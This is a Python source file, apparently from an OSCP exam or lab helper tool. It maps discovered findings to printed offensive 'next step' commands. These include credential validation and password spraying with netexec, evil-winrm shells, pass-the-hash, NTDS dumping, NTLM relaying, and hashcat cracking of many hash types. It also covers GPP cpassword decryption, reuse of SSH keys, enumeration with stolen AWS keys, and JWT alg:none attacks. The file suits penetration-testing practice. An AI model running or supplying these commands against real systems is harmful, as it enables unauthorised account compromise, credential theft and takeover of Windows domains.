"""playbook.py - findings-driven NEXT STEPS. OSCP-legal: suggestions, not actions."""
PLAYBOOK = {
    "CRED PAIRS": [
        ("validate the credential", "netexec smb <DC-IP> -u '<user>' -p '<pass>' -k", "green [+] = valid. Drop -k if NTLM allowed."),
        ("spray it (password reuse)", "netexec smb <DC-IP> -u users.txt -p '<pass>' --continue-on-success -k", "may belong to a DIFFERENT user."),
        ("try a shell", "evil-winrm -i <DC-IP> -u '<user>' -p '<pass>'   # -r <REALM> for kerberos", "needs Remote Management Users."),
    ],
    "ENCODED/DECODED": [("validate the decoded value", "netexec smb <DC-IP> -u '<user>' -p '<decoded>' -k", "base64-wrapped = almost always live creds.")],
    "SQLITE": [
        ("if password column is a HASH, crack it", "hashid '<hash>'; hashcat <hash> rockyou.txt", "plaintext row = use directly with netexec."),
    ],
    "bcrypt": [("crack bcrypt", "hashcat -m 3200 hashes.txt rockyou.txt", "slow by design.")],
    "sha512crypt": [("crack $6$", "hashcat -m 1800 hashes.txt rockyou.txt", "standard Linux shadow hash.")],
    "sha256crypt": [("crack $5$", "hashcat -m 7400 hashes.txt rockyou.txt", "")],
    "md5crypt": [("crack $1$", "hashcat -m 500 hashes.txt rockyou.txt", "older Linux/Cisco.")],
    "NTLM pair": [
        ("crack the NT hash", "hashcat -m 1000 <nthash> rockyou.txt", "second half of pair = NT hash."),
        ("OR pass-the-hash", "netexec smb <DC-IP> -u '<user>' -H '<nthash>'", "PtH works without cracking."),
        ("dump more (if admin)", "netexec smb <DC-IP> -u '<user>' -H '<nthash>' --ntds", ""),
    ],
    "NetNTLMv2": [
        ("crack (from responder/relay)", "hashcat -m 5600 hashes.txt rockyou.txt", "challenge/response - not PtH-able."),
        ("OR relay it", "impacket-ntlmrelayx -tf targets.txt -smb2support", "needs signing:False."),
    ],
    "GPP cpassword": [
        ("decrypt (key is public - instant)", "gpp-decrypt '<cpassword-value>'", "Microsoft published the AES key. Guaranteed plaintext."),
        ("validate recovered cred", "netexec smb <DC-IP> -u '<user>' -p '<decrypted>' -k", "GPP creds often local-admin everywhere."),
    ],
    "Private key hdr": [
        ("use SSH key", "chmod 600 <keyfile>; ssh -i <keyfile> <user>@<TARGET-IP>", "wrong perms = ssh refuses."),
        ("crack if encrypted", "ssh2john <keyfile> > k.hash; hashcat -m 22931 k.hash rockyou.txt", "look for 'ENCRYPTED' in header."),
    ],
    "KeePass": [("crack KeePass", "keepass2john <file.kdbx> > kp.hash; hashcat -m 13400 kp.hash rockyou.txt", "use -k for a keyfile.")],
    "AWS access key": [("validate + enum", "aws configure set aws_access_key_id <AKIA...>; aws sts get-caller-identity", "then aws s3 ls / iam list-users.")],
    "JWT": [("inspect + attack", "echo '<jwt>' | cut -d. -f2 | base64 -d", "try alg:none, or hashcat -m 16500.")],
    "shadow": [("crack /etc/shadow", "unshadow passwd.txt shadow.txt > u; hashcat u rockyou.txt", "needs matching /etc/passwd.")],
    "conn string": [("connect", "mysql -h <host> -u <user> -p<pass>   # or mssqlclient.py <user>@<host>", "creds are in the URI.")],
    "URL with creds": [("extract + reuse", "# parse proto://user:pass@host; test against other services", "people reuse these.")],
    "INTERESTING FILES": [("read each flagged file", "cat <file>   # binaries: file <file>; strings <file>", "secret may be unlabeled.")],
}
SIGNAL_ORDER = ["CRED PAIRS","ENCODED/DECODED","GPP cpassword","SQLITE","NTLM pair","NetNTLMv2","bcrypt","sha512crypt","sha256crypt","md5crypt","shadow","Private key hdr","KeePass","JWT","AWS access key","conn string","URL with creds","INTERESTING FILES"]
def emit(report, signals_present, c):
    steps = [(s, PLAYBOOK[s]) for s in SIGNAL_ORDER if s in signals_present and s in PLAYBOOK]
    if not steps: return
    out = [c("blue", "\n══════════ NEXT STEPS  (based on your findings) ══════════")]
    for sig, entries in steps:
        out.append(c("yellow", f"\n  ▸ {sig}"))
        for label, cmd, note in entries:
            out.append(c("green", f"    {label}:"))
            out.append("      " + c("cyan", cmd))
            if note: out.append(c("dim", f"        ({note})"))
    print("\n".join(out))
